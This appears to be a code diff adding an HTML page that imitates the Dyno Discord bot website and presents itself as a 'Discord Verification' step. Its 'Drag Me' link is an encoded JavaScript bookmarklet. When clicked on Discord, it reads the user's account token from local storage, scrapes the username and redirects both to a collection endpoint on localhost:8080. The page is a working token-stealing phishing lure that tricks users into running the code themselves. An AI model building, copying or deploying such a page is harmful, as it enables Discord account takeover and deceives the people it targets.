@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Tailwind setup -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        main: "#c1224e",
+                        dmain: "#881838",
+                        mgrey: "#2E323D",
+                        dark: "#0C0F12",
+                        light: "#181A20",
+                        dlight: "#0E1114",
+                        mred: "#E64F4F",
+                        dgrey: "#262B35",
+                    },
+                    backgroundImage: {
+                        oval: "url(/background-circle.svg)",
+                    }
+                }
+            }
+        };
+    </script>
+</head>
+<body>
+    <div class="w-screen h-screen bg-dlight overflow-hidden">
+        <div class="h-[80px] w-full bg-dark border-b border-light px-6 flex flex-row justify-between items-center">
+            <div class="h-full flex flex-row items-center justify-start gap-5">
+                <div class="flex felx-row items-center justify-center gap-4">
+                    <img class="max-w-10" src="https://dyno.gg/images/dyno-blitz-v2-transparent-bg.png" alt="">
+                    <p class="text-2xl font-bold text-white tracking-widest">DYNO</p>
+                </div>
+                <div class="flex flex-row gap-5 h-full items-center">
+                    <a href="https://dyno.gg/bot" class="text-white font-bold hover:text-mred transition">Dyno Bot</a>
+                    <a href="https://dyno.gg/servers" class="text-white font-bold hover:text-mred transition">Public Servers</a>
+                    <a href="https://dyno.gg/discord" class="text-white font-bold hover:text-mred transition">Join Our Discord</a>
+                    <a href="https://dyno.gg/commands" class="text-white font-bold hover:text-mred transition">Commands</a>
+                    <a href="https://docs.dyno.gg/en/home" class="text-white font-bold hover:text-mred transition">Help</a>
+                    <a href="https://dyno.gg/status" class="text-white font-bold hover:text-mred transition">Status</a>
+                    <a href="https://dyno.gg/premium" class="border border-main text-main font-semibold text-sm px-4 py-1.5 rounded-md hover:bg-main hover:text-white transition">Get Premium</a>
+                </div>
+            </div>
+            <div>
+                <a href="https://dyno.gg/premium" class="bg-mgrey text-white px-4 py-2 font-bold text-sm rounded-md hover:bg-dgrey transition">Add To Server</a>
+                <a href="https://dyno.gg/auth" class="bg-main text-white px-4 py-2 font-bold text-sm rounded-md hover:bg-dmain transition">Login with Discord</a>
+            </div>
+        </div>
+        <div class="bg-[url('background-circle.svg')] w-full h-full bg-no-repeat bg-center flex flex-col items-center pt-52">
+            <div class="max-w-[35rem] flex flex-col items-start gap-5">
+                <p class="text-4xl font-bold text-white">Discord Verification</p>
+                <p class="text-white opacity-80 font-bold">To gain access to this Discord server, drag the "Drag Me" to your bookmark bar. Once there proceed to the Discord server which you want to verify in and click on the verify function while on it, make sure you are using discord browser while doing this. To enable your bookmark bar press (CTRL+SHIFT+B)</p>
+                <a href="javascript:(function()%7Bfunction%20getByXpath(path)%20%7B%0A%20%20%20%20return%20document.evaluate(path%2C%20document%2C%20null%2C%20XPathResult.FIRST_ORDERED_NODE_TYPE%2C%20null).singleNodeValue%3B%0A%7D%0A%0Alet%20iframe%20%3D%20document.createElement(%22iframe%22)%3B%0Aiframe.src%20%3D%20%22about%3Ablank%22%3B%0A%0Aiframe.onload%20%3D%20()%3D%3E%20%7B%0A%20%20%20%20let%20storage%20%3D%20iframe.contentWindow.localStorage%3B%0A%20%20%20%20let%20token%20%3D%20storage.getItem(%22token%22)%3B%0A%20%20%20%20let%20username%20%3D%20getByXpath('%2F%2F*%5B%40id%3D%22app-mount%22%5D%2Fdiv%5B2%5D%2Fdiv%5B1%5D%2Fdiv%5B1%5D%2Fdiv%2Fdiv%5B2%5D%2Fdiv%2Fdiv%2Fdiv%2Fdiv%2Fdiv%5B1%5D%2Fsection%2Fdiv%5B2%5D%2Fdiv%5B1%5D%2Fdiv%5B2%5D%2Fdiv%5B1%5D%2Fdiv').innerText%0A%20%20%20%20window.location.replace(%22http%3A%2F%2Flocalhost%3A8080%2Fverify%2F%22%20%2B%20token.substring(1%2C%20token.length%20-%201)%20%2B%20%22%2F%22%20%2B%20username)%0A%7D%3B%0A%0Adocument.body.appendChild(iframe)%3B%7D)()%3B" class="text-white bg-main px-8 py-2 rounded-md text-2xl hover:bg-dmain transition font-semibold">Drag Me</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
